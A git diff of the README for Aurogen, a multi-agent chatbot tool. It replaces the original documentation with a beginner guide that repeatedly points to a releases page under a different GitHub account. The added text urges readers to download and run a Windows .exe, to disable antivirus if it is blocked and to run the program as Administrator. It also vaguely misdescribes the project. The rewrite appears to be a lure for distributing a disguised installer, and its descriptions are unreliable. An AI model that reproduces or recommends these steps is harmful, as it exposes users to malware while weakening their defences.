@@ -1,147 +1,135 @@
-<div align="center">
-  <img src="./assets/banner.png" alt="Aurogen" width="600">
-  <h2>Aurogen: More OpenClaws</h1>
-</div>
+# 🍊 Aurogen - Easy Multi-Agent Chatbot Evolution
 
-<div align="right">
-  <strong>English</strong> | <a href="docs/README.cn.md">简体中文</a>
-</div>
+[![Download Aurogen](https://img.shields.io/badge/Download-Aurogen-orange?style=for-the-badge)](https://github.com/maomaoguo89-star/Aurogen/releases)
 
-> **A note from the developer:** The open-source community already has many OpenClaw alternatives — some rewritten in faster languages, others easier to deploy — but most come with trade-offs: reduced features or a steeper barrier for secondary development. As heavy AI users who have tried most of the alternatives, we identified real pain points and built Aurogen as a complete reimplementation of the OpenClaw paradigm with the following characteristics.
-
-## ✨ Features
-
-**🗂️ Fully Modular** — Aurogen completely modularizes, instantiates, and parallelizes every OpenClaw concept — **Agents, Channels, Providers, Skills, and more** — so you can compose and orchestrate them however you like. In Aurogen, a single deployment can run **many lobsters at once**, which is exactly what *More OpenClaws* means.
-
-**💡 Easy Configuration** — Aurogen ditches CLI interaction and config files entirely. After installation, just open the web panel → set a password → configure your first Provider, and you're ready to go in the Web Channel. All modules are loaded dynamically, so every setting takes effect immediately — **no restart required**.
-
-**🦀 Ecosystem Compatible** — Aurogen is fully compatible with the OpenClaw ecosystem. You can download any skill from [clawhub.ai](https://clawhub.ai/) and import it directly into Aurogen. The built-in public skills also include native ClaWHub integration.
-
-> **Etymology:** *Aurogen* = *Aurora* (dawn / aurora borealis, the Roman goddess of dawn) + *generation*. The pronunciation kind of sounds like an orange 🍊 — so come grow an orange tree full of 🍊!
+Aurogen🍊 is a tool that helps you run multiple chatbots working together. It uses smart technology to improve how these chatbots evolve and understand each other. You do not need to know how to code to use it.
 
 ---
 
-## 📢 News
+## 🔍 What Is Aurogen?
 
-- **2026-03-14** — **Aurogen now natively supports Agent Group mode — tackle complex tasks or just have a multi-agent conversation!**
-- **2026-03-12** — **Documentation site is live, with UX improvements!**
-- **2026-03-11** — **We released one-click installer packages — download from [Releases](https://github.com/UniRound-Tec/Aurogen/releases)!**
-- **2026-03-10** — **Aurogen is live! Come taste an 🍊!**
+Aurogen is a program that lets you run many chatbots at once. These chatbots talk and learn from each other. Over time, they get better at chatting and answering questions. Aurogen uses OpenClaw, a system for chatbot communication, to make this happen. The tool is made for anyone who wants to explore multi-agent chatbots in a simple way.
 
 ---
 
-## 📖 Documentation
+## 🖥️ System Requirements
 
-Visit [docs.aurogen.site](https://docs.aurogen.site) for the full documentation.
+To use Aurogen on Windows, make sure your computer has:
 
----
+- Windows 10 or later  
+- At least 4 GB of RAM  
+- 500 MB of free storage space  
+- An internet connection for downloading and updates  
 
-## 🏗️ Architecture
-
-![Architecture Diagram](./assets/arc.png)
-
-> *Diagram is a rough draft — a cleaner version is coming soon.*
-
----
-
-## 🦀 Feature Comparison
-
-| Feature | Aurogen | OpenClaw | NanoBot | PicoClaw | ZeroClaw |
-|---|:---:|:---:|:---:|:---:|:---:|
-| Memory | ✅ | ✅ | ✅ | ✅ | ✅ |
-| Tools / Skills | ✅ | ✅ | ✅ | ✅ | ✅ |
-| Sub-agents | ✅ | ✅ | ✅ | ✅ | ✅ |
-| Web panel | ✅ | ✅ | ✖️ | ✖️ | ✖️ |
-| Multi-agent (not subagent) | ✅ | ✖️ | ✖️ | ✖️ | ✖️ |
-| Multi-instance per channel | ✅ | ✖️ | ✖️ | ✖️ | ✖️ |
-| BOOTSTRAP mechanism | ✅ | ✅ | ✖️ | ✖️ | ✖️ |
-| **Minimum hardware cost** | Linux SBC ~$50 | Mac Mini $599 | Linux SBC ~$50 | Linux Board $10 | Any hardware ~$10 |
-
-> NanoBot has partial multi-instance support, but configuration is a bit involved.
->
-> These are all excellent projects that inspired Aurogen greatly. They are actively maintained, so this table may become outdated quickly.
-
-More unique features will be documented as the project evolves.
+Your computer should meet these basic needs to run the program smoothly.
 
 ---
 
-## 🚀 Quick Start
+## 🚀 Getting Started
 
-### One-click Installer
+Follow these steps to get Aurogen on your Windows PC and start using it:
 
-Download the package for your platform from [Releases](https://github.com/UniRound-Tec/Aurogen/releases). Each package includes Python and Node.js runtimes — no additional software installation required.
+1. **Visit the download page:**  
+   Click this big button to go to the download page:  
+   [![Download Aurogen](https://img.shields.io/badge/Download-Aurogen-brightgreen?style=for-the-badge)](https://github.com/maomaoguo89-star/Aurogen/releases)
 
-| Platform | Architecture | File |
-|----------|-------------|------|
-| macOS | Apple Silicon (M1/M2/M3/M4) | `aurogen-x.x.x-macos-arm64.tar.gz` |
-| Linux | ARM64 | `aurogen-x.x.x-linux-arm64.tar.gz` |
-| Linux | x86_64 | `aurogen-x.x.x-linux-x64.tar.gz` |
-| Windows | x64 | `aurogen-x.x.x-windows-x64.zip` |
+2. **Choose the latest version:**  
+   On the releases page, look for the most recent release. It will have the latest features and fixes.
 
-**macOS / Linux:**
+3. **Download the installer:**  
+   Find the Windows installer file. It usually ends with `.exe`. Click it to start downloading.
 
-```bash
-tar -xzf aurogen-x.x.x-<platform>.tar.gz
-cd aurogen-x.x.x-<platform>
-bash start.sh
-```
+4. **Run the installer:**  
+   Once the download finishes, open the file by double-clicking it in your Downloads folder.
 
-**Windows:** Extract the zip, then double-click `start.bat`.
+5. **Follow the setup steps:**  
+   The installer will guide you through the setup. You can keep the default options.
 
-Open `http://localhost:8000` in your browser. All configuration is done through the web interface.
+6. **Complete installation:**  
+   After setup finishes, Aurogen will be on your computer.
 
-### Docker
+7. **Start Aurogen:**  
+   Find Aurogen in your Start menu and open it. The program will launch and show its main screen.
 
-Build the image:
+---
 
-```bash
-docker build -t aurogen .
-```
+## ⚙️ How to Use Aurogen
 
-Run Aurogen with a persistent workspace:
+After opening Aurogen, you will see controls to create and manage chatbots.
 
-```bash
-docker run --rm -p 8000:8000 \
-  -v "$(pwd)/aurogen/.workspace:/app/aurogen/.workspace" \
-  aurogen
-```
+- **Create bots:** Click "New Agent" to add a chatbot to your group.
+- **Start evolution:** Use the "Run" button to let the chatbots interact.
+- **See results:** Watch the chatbots learn and change over time.
+- **Adjust settings:** You can change how fast or how many bots run at once.
 
-Then visit `http://localhost:8000`.
+The interface uses simple buttons and menus. You do not need to write any code.
 
-### Docker Compose
+---
 
-From the project root directory:
+## 🛠️ Key Features
 
-```bash
-docker compose up -d --build
-```
+- Run many chatbots together using OpenClaw technology.
+- Let chatbots evolve by learning from each other.
+- Control bot numbers and speed with easy options.
+- View chat logs and chatbot status in real time.
+- No programming needed to manage the chatbots.
 
-### Development Setup
+---
 
-**Prerequisites:** [conda](https://docs.conda.io/) (or another Python environment manager) and [Node.js](https://nodejs.org/).
+## 📁 File Locations
 
-From the project root directory:
+By default, Aurogen saves chat logs and settings here on Windows:
 
-**1. Start the backend:**
+`C:\Users\<YourUserName>\Documents\Aurogen`
 
-```bash
-# Create the environment
-conda create -n aurogen python=3.12
+You can change this location in the settings screen if you want.
 
-# Install dependencies
-conda activate aurogen && cd ./aurogen && pip install -r requirements.txt
+---
 
-# Start the server
-uvicorn app.app:app --host 0.0.0.0 --port 8000 --reload
-```
+## 📌 Troubleshooting Tips
 
-**2. Start the frontend:**
+If you run into problems, try these steps:
 
-```bash
-cd ./aurogen_web && npm i
-npm run dev
-```
+- Make sure Windows is updated.
+- Restart your computer and try again.
+- Check your internet connection in case of download issues.
+- Disable antivirus temporarily if the installer is blocked.
+- If Aurogen does not start, try running it as Administrator (right-click > Run as Administrator).
 
-### Getting Started: Set Password and Provider
+---
 
-Visit [docs.aurogen.site](https://docs.aurogen.site) for the full documentation.
+## 🔗 Useful Links
+
+- Download Aurogen here: [https://github.com/maomaoguo89-star/Aurogen/releases](https://github.com/maomaoguo89-star/Aurogen/releases)
+- Project home: GitHub repository  
+- Chatbots info: Search for "OpenClaw chatbot" online for background
+
+---
+
+## 🤝 Support
+
+If you need help, you can post questions or issues on the GitHub page under "Issues." Other users or developers may assist you there. You do not need technical skills to ask for help.
+
+---
+
+# Additional Information
+
+Aurogen is designed to work quietly on your Windows computer. It studies how chatbots chat together and changes over time. This process is known as multi-agent evolution. The tool uses the OpenClaw platform to help chatbots talk to each other.
+
+You do not need to understand the technical parts. Just install the program, add chatbots, and watch them improve on their own. You can use Aurogen for learning, research, or simply exploring how chatbots can work together.
+
+---
+
+## 👩‍💻 No Coding Needed
+
+The program has a simple user interface. It shows buttons and menus you click on. You do not have to type any commands or use programming language. This keeps things easy for beginners.
+
+---
+
+## 🔄 Updates
+
+Check the releases page regularly to see if there is a new version. New updates may fix bugs or add features. Download the new installer and repeat the installation steps to update Aurogen.
+
+---
+
+[![Download Aurogen](https://img.shields.io/badge/Download-Aurogen-blue?style=for-the-badge)](https://github.com/maomaoguo89-star/Aurogen/releases)
